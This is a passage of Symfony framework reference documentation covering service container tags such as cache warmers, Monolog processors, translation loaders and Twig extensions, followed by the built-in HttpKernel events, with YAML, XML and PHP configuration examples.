        public function isOptional(): bool
        {
            return true;
        }
    }

The ``warmUp()`` method must return an array with the files and classes to
preload. Files must be absolute paths and classes must be fully-qualified class
names. The only restriction is that files must be stored in the cache directory.
If you don't need to preload anything, return an empty array. If read-only
artifacts need to be created, you can store them in a different directory
with the ``$buildDir`` parameter of the ``warmUp()`` method.

The ``isOptional()`` method should return true if it's possible to use the
application without calling this cache warmer. In Symfony, optional warmers
are always executed by default (you can change this by using the
``--no-optional-warmers`` option when executing the command).

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
your service will be automatically tagged with ``kernel.cache_warmer``. But, you
can also register it manually:

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Cache\MyCustomWarmer:
                tags:
                    - { name: kernel.cache_warmer, priority: 0 }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Cache\MyCustomWarmer">
                    <tag name="kernel.cache_warmer" priority="0"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Cache\MyCustomWarmer;

        $container
            ->register(MyCustomWarmer::class)
            ->addTag('kernel.cache_warmer', ['priority' => 0])
        ;

.. note::

    The ``priority`` is optional and its value is a positive or negative integer
    that defaults to ``0``. The higher the number, the earlier that warmers are
    executed.

.. caution::

    If your cache warmer fails its execution because of any exception, Symfony
    won't try to execute it again for the next requests. Therefore, your
    application and/or bundles should be prepared for when the contents
    generated by the cache warmer are not available.

.. _core-cache-warmers:

In addition to your own cache warmers, Symfony components and third-party
bundles define cache warmers too for their own purposes. You can list them all
with the following command:

.. code-block:: terminal

    $ php bin/console debug:container --tag=kernel.cache_warmer

.. _dic-tags-kernel-event-listener:

kernel.event_listener
---------------------

**Purpose**: To listen to different events/hooks in Symfony

During the execution of a Symfony application, different events are triggered
and you can also dispatch custom events. This tag allows you to *hook* your own
classes into any of those events.

For a full example of this listener, read the :doc:`/event_dispatcher`
article.

Core Event Listener Reference
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

For the reference of Event Listeners associated with each kernel event,
see the :doc:`Symfony Events Reference </reference/events>`.

.. _dic-tags-kernel-event-subscriber:

kernel.event_subscriber
-----------------------

**Purpose**: To subscribe to a set of different events/hooks in Symfony

This is an alternative way to create an event listener, and is the recommended
way (instead of using ``kernel.event_listener``). See :ref:`events-subscriber`.

kernel.fragment_renderer
------------------------

**Purpose**: Add a new HTTP content rendering strategy

To add a new rendering strategy - in addition to the core strategies like
``EsiFragmentRenderer`` - create a class that implements
:class:`Symfony\\Component\\HttpKernel\\Fragment\\FragmentRendererInterface`,
register it as a service, then tag it with ``kernel.fragment_renderer``.

kernel.locale_aware
-------------------

**Purpose**: To access and use the current :ref:`locale <translation-locale>`

Setting and retrieving the locale can be done via configuration or using
container parameters, listeners, route parameters or the current request.

Thanks to the ``Translation`` contract, the locale can be set via services.

To register your own locale aware service, first create a service that implements
the :class:`Symfony\\Contracts\\Translation\\LocaleAwareInterface` interface::

    // src/Locale/MyCustomLocaleHandler.php
    namespace App\Locale;

    use Symfony\Contracts\Translation\LocaleAwareInterface;

    class MyCustomLocaleHandler implements LocaleAwareInterface
    {
        public function setLocale(string $locale): void
        {
            $this->locale = $locale;
        }

        public function getLocale(): string
        {
            return $this->locale;
        }
    }

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
your service will be automatically tagged with ``kernel.locale_aware``. But, you
can also register it manually:

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Locale\MyCustomLocaleHandler:
                tags: [kernel.locale_aware]

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Locale\MyCustomLocaleHandler">
                    <tag name="kernel.locale_aware"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Locale\MyCustomLocaleHandler;

        $container
            ->register(LocaleHandler::class)
            ->addTag('kernel.locale_aware')
        ;

kernel.reset
------------

**Purpose**: Clean up services between requests

In all main requests (not :ref:`sub-requests <http-kernel-sub-requests>`) except
the first one, Symfony looks for any service tagged with the ``kernel.reset`` tag
to reinitialize their state. This is done by calling to the method whose name is
configured in the ``method`` argument of the tag.

This is mostly useful when running your projects in application servers that
reuse the Symfony application between requests to improve performance. This tag
is applied for example to the built-in :ref:`data collectors <profiler-data-collector>`
of the profiler to delete all their information.

.. _dic_tags-mime:

mime.mime_type_guesser
----------------------

**Purpose**: Add your own logic for guessing MIME types

This tag is used to register your own :ref:`MIME type guessers <components-mime-type-guess>`
in case the guessers provided by the :doc:`Mime component </components/mime>`
don't fit your needs.

.. _dic_tags-monolog:

monolog.logger
--------------

**Purpose**: To use a custom logging channel with Monolog

Monolog allows you to share its handlers between several logging channels.
The logger service uses the channel ``app`` but you can change the
channel when injecting the logger in a service.

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Log\CustomLogger:
                arguments: ['@logger']
                tags:
                    - { name: monolog.logger, channel: app }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Log\CustomLogger">
                    <argument type="service" id="logger"/>
                    <tag name="monolog.logger" channel="app"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Log\CustomLogger;
        use Symfony\Component\DependencyInjection\Reference;

        $container->register(CustomLogger::class)
            ->addArgument(new Reference('logger'))
            ->addTag('monolog.logger', ['channel' => 'app']);

.. tip::

    You can create :doc:`custom channels </logging/channels_handlers>` and
    even :ref:`autowire logging channels <monolog-autowire-channels>`.

.. _dic_tags-monolog-processor:

monolog.processor
-----------------

**Purpose**: Add a custom processor for logging

Monolog allows you to add processors in the logger or in the handlers to
add extra data in the records. A processor receives the record as an argument
and must return it after adding some extra data in the ``extra`` attribute
of the record.

The built-in ``IntrospectionProcessor`` can be used to add the file, the
line, the class and the method where the logger was triggered.

You can add a processor globally:

.. configuration-block::

    .. code-block:: yaml

        services:
            Monolog\Processor\IntrospectionProcessor:
                tags: [monolog.processor]

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="Monolog\Processor\IntrospectionProcessor">
                    <tag name="monolog.processor"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use Monolog\Processor\IntrospectionProcessor;

        $container
            ->register(IntrospectionProcessor::class)
            ->addTag('monolog.processor')
        ;

.. tip::

    If your service is not a callable (using ``__invoke()``) you can add the
    ``method`` attribute in the tag to use a specific method.

You can add also a processor for a specific handler by using the ``handler``
attribute:

.. configuration-block::

    .. code-block:: yaml

        services:
            Monolog\Processor\IntrospectionProcessor:
                tags:
                    - { name: monolog.processor, handler: firephp }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="Monolog\Processor\IntrospectionProcessor">
                    <tag name="monolog.processor" handler="firephp"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use Monolog\Processor\IntrospectionProcessor;

        $container
            ->register(IntrospectionProcessor::class)
            ->addTag('monolog.processor', ['handler' => 'firephp'])
        ;

You can also add a processor for a specific logging channel by using the
``channel`` attribute. This will register the processor only for the
``security`` logging channel used in the Security component:

.. configuration-block::

    .. code-block:: yaml

        services:
            Monolog\Processor\IntrospectionProcessor:
                tags:
                    - { name: monolog.processor, channel: security }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="Monolog\Processor\IntrospectionProcessor">
                    <tag name="monolog.processor" channel="security"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use Monolog\Processor\IntrospectionProcessor;

        $container
            ->register(IntrospectionProcessor::class)
            ->addTag('monolog.processor', ['channel' => 'security'])
        ;

.. note::

    You cannot use both the ``handler`` and ``channel`` attributes for the
    same tag as handlers are shared between all channels.

routing.loader
--------------

**Purpose**: Register a custom service that loads routes

To enable a custom routing loader, add it as a regular service in one
of your configuration and tag it with ``routing.loader``:

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Routing\CustomLoader:
                tags: [routing.loader]

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Routing\CustomLoader">
                    <tag name="routing.loader"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Routing\CustomLoader;

        $container
            ->register(CustomLoader::class)
            ->addTag('routing.loader')
        ;

For more information, see :doc:`/routing/custom_route_loader`.

routing.expression_language_provider
------------------------------------

**Purpose**: Register a provider for expression language functions in routing

This tag is used to automatically register
:ref:`expression function providers <components-expression-language-provider>`
for the routing expression component. Using these providers, you can add custom
functions to the routing expression language.

security.expression_language_provider
-------------------------------------

**Purpose**: Register a provider for expression language functions in security

This tag is used to automatically register :ref:`expression function providers
<components-expression-language-provider>` for the security expression
component. Using these providers, you can add custom functions to the security
expression language.

security.voter
--------------

**Purpose**: To add a custom voter to Symfony's authorization logic

When you call ``isGranted()`` on Symfony's authorization checker, a system of "voters"
is used behind the scenes to determine if the user should have access. The
``security.voter`` tag allows you to add your own custom voter to that system.

For more information, read the :doc:`/security/voters` article.

.. _reference-dic-tags-serializer-encoder:

serializer.encoder
------------------

**Purpose**: Register a new encoder in the ``serializer`` service

The class that's tagged should implement the :class:`Symfony\\Component\\Serializer\\Encoder\\EncoderInterface`
and :class:`Symfony\\Component\\Serializer\\Encoder\\DecoderInterface`.

For more details, see :doc:`/serializer`.

.. _reference-dic-tags-serializer-normalizer:

serializer.normalizer
---------------------

**Purpose**: Register a new normalizer in the Serializer service

The class that's tagged should implement the :class:`Symfony\\Component\\Serializer\\Normalizer\\NormalizerInterface`
and :class:`Symfony\\Component\\Serializer\\Normalizer\\DenormalizerInterface`.

For more details, see :doc:`/serializer`.

Run the following command to check the priorities of the default normalizers:

.. code-block:: terminal

    $ php bin/console debug:container --tag serializer.normalizer

.. _dic-tags-translation-loader:

translation.loader
------------------

**Purpose**: To register a custom service that loads translations

By default, translations are loaded from the filesystem in a variety of
different formats (YAML, XLIFF, PHP, etc).

Now, register your loader as a service and tag it with ``translation.loader``:

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Translation\MyCustomLoader:
                tags:
                    - { name: translation.loader, alias: bin }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Translation\MyCustomLoader">
                    <tag name="translation.loader" alias="bin"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Translation\MyCustomLoader;

        $container
            ->register(MyCustomLoader::class)
            ->addTag('translation.loader', ['alias' => 'bin'])
        ;

The ``alias`` option is required and very important: it defines the file
"suffix" that will be used for the resource files that use this loader.
For example, suppose you have some custom ``bin`` format that you need to
load. If you have a ``bin`` file that contains French translations for
the ``messages`` domain, then you might have a file ``translations/messages.fr.bin``.

When Symfony tries to load the ``bin`` file, it passes the path to your
custom loader as the ``$resource`` argument. You can then perform any logic
you need on that file in order to load your translations.

If you're loading translations from a database, you'll still need a resource
file, but it might either be blank or contain a little bit of information
about loading those resources from the database. The file is key to trigger
the ``load()`` method on your custom loader.

.. _reference-dic-tags-translation-extractor:

translation.extractor
---------------------

**Purpose**: To register a custom service that extracts messages from a
file

When executing the ``translation:extract`` command, it uses extractors to
extract translation messages from a file. By default, the Symfony Framework
has a :class:`Symfony\\Bridge\\Twig\\Translation\\TwigExtractor` to find and
extract translation keys from Twig templates.

If you also want to find and extract translation keys from PHP files, install
the following dependency to activate the :class:`Symfony\\Component\\Translation\\Extractor\\PhpAstExtractor`:

.. code-block:: terminal

    $ composer require nikic/php-parser

You can create your own extractor by creating a class that implements
:class:`Symfony\\Component\\Translation\\Extractor\\ExtractorInterface`
and tagging the service with ``translation.extractor``. The tag has one
required option: ``alias``, which defines the name of the extractor::

    // src/Acme/DemoBundle/Translation/FooExtractor.php
    namespace Acme\DemoBundle\Translation;

    use Symfony\Component\Translation\Extractor\ExtractorInterface;
    use Symfony\Component\Translation\MessageCatalogue;

    class FooExtractor implements ExtractorInterface
    {
        protected string $prefix;

        /**
         * Extracts translation messages from a template directory to the catalog.
         */
        public function extract(string $directory, MessageCatalogue $catalog): void
        {
            // ...
        }

        /**
         * Sets the prefix that should be used for new found messages.
         */
        public function setPrefix(string $prefix): void
        {
            $this->prefix = $prefix;
        }
    }

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Translation\CustomExtractor:
                tags:
                    - { name: translation.extractor, alias: foo }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Translation\CustomExtractor">
                    <tag name="translation.extractor" alias="foo"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Translation\CustomExtractor;

        $container->register(CustomExtractor::class)
            ->addTag('translation.extractor', ['alias' => 'foo']);

translation.dumper
------------------

**Purpose**: To register a custom service that dumps messages to a file

After a :ref:`translation extractor <reference-dic-tags-translation-extractor>`
has extracted all messages from the templates, the dumpers are executed to dump
the messages to a translation file in a specific format.

Symfony already comes with many dumpers:

* :class:`Symfony\\Component\\Translation\\Dumper\\CsvFileDumper`
* :class:`Symfony\\Component\\Translation\\Dumper\\IcuResFileDumper`
* :class:`Symfony\\Component\\Translation\\Dumper\\IniFileDumper`
* :class:`Symfony\\Component\\Translation\\Dumper\\MoFileDumper`
* :class:`Symfony\\Component\\Translation\\Dumper\\PoFileDumper`
* :class:`Symfony\\Component\\Translation\\Dumper\\QtFileDumper`
* :class:`Symfony\\Component\\Translation\\Dumper\\XliffFileDumper`
* :class:`Symfony\\Component\\Translation\\Dumper\\YamlFileDumper`

You can create your own dumper by extending
:class:`Symfony\\Component\\Translation\\Dumper\\FileDumper` or implementing
:class:`Symfony\\Component\\Translation\\Dumper\\DumperInterface` and tagging
the service with ``translation.dumper``. The tag has one option: ``alias``
This is the name that's used to determine which dumper should be used.

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Translation\JsonFileDumper:
                tags:
                    - { name: translation.dumper, alias: json }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Translation\JsonFileDumper">
                    <tag name="translation.dumper" alias="json"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Translation\JsonFileDumper;

        $container->register(JsonFileDumper::class)
            ->addTag('translation.dumper', ['alias' => 'json']);

.. _reference-dic-tags-translation-provider-factory:

translation.provider_factory
----------------------------

**Purpose**: to register a factory related to custom translation providers

When creating custom :ref:`translation providers <translation-providers>`, you
must register your factory as a service and tag it with ``translation.provider_factory``:

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Translation\CustomProviderFactory:
                tags:
                    - { name: translation.provider_factory }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Translation\CustomProviderFactory">
                    <tag name="translation.provider_factory"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Translation\CustomProviderFactory;

        $container
            ->register(CustomProviderFactory::class)
            ->addTag('translation.provider_factory')
        ;

.. _reference-dic-tags-twig-extension:

twig.extension
--------------

**Purpose**: To register a custom Twig Extension

To enable a Twig extension, add it as a regular service in one of your
configuration and tag it with ``twig.extension``. If you're using the
:ref:`default services.yaml configuration <service-container-services-load-example>`,
the service is auto-registered and auto-tagged. But, you can also register it manually:

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Twig\AppExtension:
                tags: [twig.extension]

            # optionally you can define the priority of the extension (default = 0).
            # Extensions with higher priorities are registered earlier. This is mostly
            # useful to register late extensions that override other extensions.
            App\Twig\AnotherExtension:
                tags: [{ name: twig.extension, priority: -100 }]

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Twig\AppExtension">
                    <tag name="twig.extension"/>
                </service>

                <service id="App\Twig\AnotherExtension">
                    <tag name="twig.extension" priority="-100"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Twig\AnotherExtension;
        use App\Twig\AppExtension;

        $container
            ->register(AppExtension::class)
            ->addTag('twig.extension')
        ;
        $container
            ->register(AnotherExtension::class)
            ->addTag('twig.extension', ['priority' => -100])
        ;

For information on how to create the actual Twig Extension class, see
`Twig's documentation`_ on the topic or read the
:ref:`templates-twig-extension` article.

twig.loader
-----------

**Purpose**: Register a custom service that loads Twig templates

By default, Symfony uses only one `Twig Loader`_ - `FilesystemLoader`_. If you need
to load Twig templates from another resource, you can create a service for
the new loader and tag it with ``twig.loader``.

If you use the :ref:`default services.yaml configuration <service-container-services-load-example>`,
the service will be automatically tagged thanks to autoconfiguration. But, you can
also register it manually:

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Twig\CustomLoader:
                tags:
                    - { name: twig.loader, priority: 0 }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Twig\CustomLoader">
                    <tag name="twig.loader" priority="0"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Twig\CustomLoader;

        $container
            ->register(CustomLoader::class)
            ->addTag('twig.loader', ['priority' => 0])
        ;

.. note::

    The ``priority`` is optional and its value is a positive or negative integer
    that defaults to ``0``. Loaders with higher numbers are tried first.

.. _reference-dic-tags-twig-runtime:

twig.runtime
------------

**Purpose**: To register a custom Lazy-Loaded Twig Extension

:ref:`Lazy-Loaded Twig Extensions <lazy-loaded-twig-extensions>` are defined as
regular services but they need to be tagged with ``twig.runtime``. If you're using the
:ref:`default services.yaml configuration <service-container-services-load-example>`,
the service is auto-registered and auto-tagged. But, you can also register it manually:

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Twig\AppExtension:
                tags: [twig.runtime]

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Twig\AppExtension">
                    <tag name="twig.runtime"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Twig\AppExtension;

        $container
            ->register(AppExtension::class)
            ->addTag('twig.runtime')
        ;

validator.constraint_validator
------------------------------

**Purpose**: Create your own custom validation constraint

This tag allows you to create and register your own custom validation constraint.
For more information, read the :doc:`/validation/custom_constraint` article.

validator.initializer
---------------------

**Purpose**: Register a service that initializes objects before validation

This tag provides a very uncommon piece of functionality that allows you
to perform some sort of action on an object right before it's validated.
For example, it's used by Doctrine to query for all of the lazily-loaded
data on an object before it's validated. Without this, some data on a Doctrine
entity would appear to be "missing" when validated, even though this is
not really the case.

If you do need to use this tag, just make a new class that implements the
:class:`Symfony\\Component\\Validator\\ObjectInitializerInterface` interface.
Then, tag it with the ``validator.initializer`` tag (it has no options).

For an example, see the ``DoctrineInitializer`` class inside the Doctrine
Bridge.

.. _`FilesystemLoader`: https://github.com/twigphp/Twig/blob/3.x/src/Loader/FilesystemLoader.php
.. _`Twig's documentation`: https://twig.symfony.com/doc/3.x/advanced.html#creating-an-extension
.. _`Twig Loader`: https://twig.symfony.com/doc/3.x/api.html#loaders
.. _`PHP class preloading`: https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload
Built-in Symfony Events
=======================

The Symfony framework is an HTTP Request-Response one.
During the handling of an HTTP request, the framework (or any
application using the :doc:`HttpKernel component </components/http_kernel>`)
dispatches some :doc:`events </event_dispatcher>` which you can use to modify
how the request is handled and how the response is returned.

Kernel Events
-------------

Each event dispatched by the HttpKernel component is a subclass of
:class:`Symfony\\Component\\HttpKernel\\Event\\KernelEvent`, which provides the
following information:

:method:`Symfony\\Component\\HttpKernel\\Event\\KernelEvent::getRequestType`
    Returns the *type* of the request (``HttpKernelInterface::MAIN_REQUEST``
    or ``HttpKernelInterface::SUB_REQUEST``).

:method:`Symfony\\Component\\HttpKernel\\Event\\KernelEvent::getKernel`
    Returns the Kernel handling the request.

:method:`Symfony\\Component\\HttpKernel\\Event\\KernelEvent::getRequest`
    Returns the current ``Request`` being handled.

:method:`Symfony\\Component\\HttpKernel\\Event\\KernelEvent::isMainRequest`
    Checks if this is a main request.

.. _kernel-core-request:

``kernel.request``
~~~~~~~~~~~~~~~~~~

**Event Class**: :class:`Symfony\\Component\\HttpKernel\\Event\\RequestEvent`

This event is dispatched very early in Symfony, before the controller is
determined. It's useful to add information to the Request or return a Response
early to stop the handling of the request.

.. seealso::

    Read more on the :ref:`kernel.request event <component-http-kernel-kernel-request>`.

Execute this command to find out which listeners are registered for this event and
their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher kernel.request

``kernel.controller``
~~~~~~~~~~~~~~~~~~~~~

**Event Class**: :class:`Symfony\\Component\\HttpKernel\\Event\\ControllerEvent`

This event is dispatched after the controller has been resolved but before executing
it. It's useful to initialize things later needed by the
controller, such as `param converters`_, and even to change the controller
entirely::

    use Symfony\Component\HttpKernel\Event\ControllerEvent;

    public function onKernelController(ControllerEvent $event): void
    {
        // ...

        // the controller can be changed to any PHP callable
        $event->setController($myCustomController);
    }

.. seealso::

    Read more on the :ref:`kernel.controller event <component-http-kernel-kernel-controller>`.

Execute this command to find out which listeners are registered for this event and
their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher kernel.controller

``kernel.controller_arguments``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Event Class**: :class:`Symfony\\Component\\HttpKernel\\Event\\ControllerArgumentsEvent`

This event is dispatched just before a controller is called. It's useful to
configure the arguments that are going to be passed to the controller.
Typically, this is used to map URL routing parameters to their corresponding
named arguments; or pass the current request when the ``Request`` type-hint is
found::

    use Symfony\Component\HttpKernel\Event\ControllerArgumentsEvent;

    public function onKernelControllerArguments(ControllerArgumentsEvent $event): void
    {
        // ...

        // get controller and request arguments
        $namedArguments = $event->getRequest()->attributes->all();
        $controllerArguments = $event->getArguments();

        // set the controller arguments to modify the original arguments or add new ones
        $event->setArguments($newArguments);
    }

Execute this command to find out which listeners are registered for this event and
their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher kernel.controller_arguments

``kernel.view``
~~~~~~~~~~~~~~~

**Event Class**: :class:`Symfony\\Component\\HttpKernel\\Event\\ViewEvent`

This event is dispatched after the controller has been executed but *only* if
the controller does *not* return a :class:`Symfony\\Component\\HttpFoundation\\Response`
object. It's useful to transform the returned value (e.g. a string with some
HTML contents) into the ``Response`` object needed by Symfony::

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Event\ViewEvent;

    public function onKernelView(ViewEvent $event): void
    {
        $value = $event->getControllerResult();
        $response = new Response();

        // ... somehow customize the Response from the return value

        $event->setResponse($response);
    }

.. seealso::

    Read more on the :ref:`kernel.view event <component-http-kernel-kernel-view>`.

Execute this command to find out which listeners are registered for this event and
their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher kernel.view

``kernel.response``
~~~~~~~~~~~~~~~~~~~

**Event Class**: :class:`Symfony\\Component\\HttpKernel\\Event\\ResponseEvent`

This event is dispatched after the controller or any ``kernel.view`` listener
returns a ``Response`` object. It's useful to modify or replace the response
before sending it back (e.g. add/modify HTTP headers, add cookies, etc.)::

    use Symfony\Component\HttpKernel\Event\ResponseEvent;

    public function onKernelResponse(ResponseEvent $event): void
    {
        $response = $event->getResponse();

        // ... modify the response object
    }

.. seealso::

    Read more on the :ref:`kernel.response event <component-http-kernel-kernel-response>`.

Execute this command to find out which listeners are registered for this event and
their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher kernel.response

``kernel.finish_request``
~~~~~~~~~~~~~~~~~~~~~~~~~

**Event Class**: :class:`Symfony\\Component\\HttpKernel\\Event\\FinishRequestEvent`

This event is dispatched after the ``kernel.response`` event. It's useful to reset
the global state of the application (for example, the translator listener resets
the translator's locale to the one of the parent request)::

    use Symfony\Component\HttpKernel\Event\FinishRequestEvent;

    public function onKernelFinishRequest(FinishRequestEvent $event): void
    {
        if (null === $parentRequest = $this->requestStack->getParentRequest()) {
            return;
        }

        // reset the locale of the subrequest to the locale of the parent request
        $this->setLocale($parentRequest);
    }

Execute this command to find out which listeners are registered for this event and
their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher kernel.finish_request

``kernel.terminate``
~~~~~~~~~~~~~~~~~~~~

**Event Class**: :class:`Symfony\\Component\\HttpKernel\\Event\\TerminateEvent`

This event is dispatched after the response has been sent (after the execution
of the :method:`Symfony\\Component\\HttpKernel\\HttpKernel::handle` method).
It's useful to perform slow or complex tasks that don't need to be completed to
send the response (e.g. sending emails).

.. seealso::

    Read more on the :ref:`kernel.terminate event <component-http-kernel-kernel-terminate>`.

Execute this command to find out which listeners are registered for this event and
their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher kernel.terminate

.. _kernel-kernel.exception:

``kernel.exception``
~~~~~~~~~~~~~~~~~~~~

**Event Class**: :class:`Symfony\\Component\\HttpKernel\\Event\\ExceptionEvent`

This event is dispatched as soon as an error occurs during the handling of the
HTTP request. It's useful to recover from errors or modify the exception details
sent as response::

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Event\ExceptionEvent;

    public function onKernelException(ExceptionEvent $event): void
    {
        $exception = $event->getThrowable();
        $response = new Response();
        // setup the Response object based on the caught exception
        $event->setResponse($response);

        // you can alternatively set a new Exception
        // $exception = new \Exception('Some special exception');
        // $event->setThrowable($exception);
    }

.. note::

    The TwigBundle registers an :class:`Symfony\\Component\\HttpKernel\\EventListener\\ErrorListener`
    that forwards the ``Request`` to a given controller defined by the
    ``exception_listener.controller`` parameter.

Symfony uses the following logic to determine the HTTP status code of the
response:

* If :method:`Symfony\\Component\\HttpFoundation\\Response::isClientError`,
  :method:`Symfony\\Component\\HttpFoundation\\Response::isServerError` or
  :method:`Symfony\\Component\\HttpFoundation\\Response::isRedirect` is true,
  then the status code on your ``Response`` object is used;

* If the original exception implements
  :class:`Symfony\\Component\\HttpKernel\\Exception\\HttpExceptionInterface`,
  then ``getStatusCode()`` is called on the exception and used (the headers
  from ``getHeaders()`` are also added);

* If both of the above aren't true, then a 500 status code is used.

.. note::

    If you want to overwrite the status code of the exception response, which
    you should not without a good reason, call
    ``ExceptionEvent::allowCustomResponseCode()`` first and then
    set the status code on the response::

        $event->allowCustomResponseCode();
        $response = new Response('No Content', 204);
        $event->setResponse($response);

    The status code sent to the client in the above example will be ``204``. If
    ``$event->allowCustomResponseCode()`` is omitted, then the kernel will set
    an appropriate status code based on the type of exception thrown.

.. seealso::

    Read more on the :ref:`kernel.exception event <component-http-kernel-kernel-exception>`.

Execute this command to find out which listeners are registered for this event and
their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher kernel.exception

.. _`param converters`: https://symfony.com/doc/master/bundles/SensioFrameworkExtraBundle/annotations/converters.html
Reference Documents
===================

.. include:: /reference/map.rst.inc
Configuration Options
---------------------

Ever wondered what configuration options you have available to you in
``config/packages/*.yaml`` files? In this section, all the available
configuration is broken down by the key (e.g. ``framework``) that defines
